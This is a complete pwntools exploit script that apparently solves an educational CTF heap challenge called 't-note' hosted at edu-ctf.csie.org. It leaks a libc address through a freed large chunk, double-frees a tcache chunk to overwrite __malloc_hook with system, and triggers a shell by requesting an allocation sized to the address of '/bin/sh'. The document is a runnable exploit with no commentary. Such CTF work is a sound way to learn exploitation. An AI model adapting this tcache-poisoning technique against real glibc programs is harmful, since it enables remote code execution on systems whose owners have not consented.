from pwn import *

p = remote('edu-ctf.csie.org', 10179)
# p = process('./t-note')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def add(size, note):
    p.sendlineafter('>', str(1))
    p.sendlineafter('Size:', str(size))
    p.sendlineafter('Note:', note)

def show(index):
    p.sendlineafter('>', str(2))
    p.sendlineafter('Index:', str(index))


def delete(index):
    p.sendlineafter('>', str(3))
    p.sendlineafter('Index:', str(index))

add(0x420, 'a' * 0x8e)
add(0x60, 'a' * 0xe)
delete(0)
show(0)
p.recvuntil('Note 0:\x0a')
libc.address = u64(p.recv(6).ljust(0x8, '\0')) - 0x3ebca0
log.info('libc.address : %s' % hex(libc.address))
log.info('libc /bin/sh address : %s' % hex(libc.search('/bin/sh').next()))

add(0x60, 'a' * 0xe)
delete(1)
delete(1)

add(0x60, p64(libc.symbols['__malloc_hook']))
add(0x60, 'garbage')
add(0x60, p64(libc.symbols['system']))

p.sendlineafter('>', str(1))
p.sendlineafter('Size:', str(libc.search('/bin/sh').next()))

p.interactive()
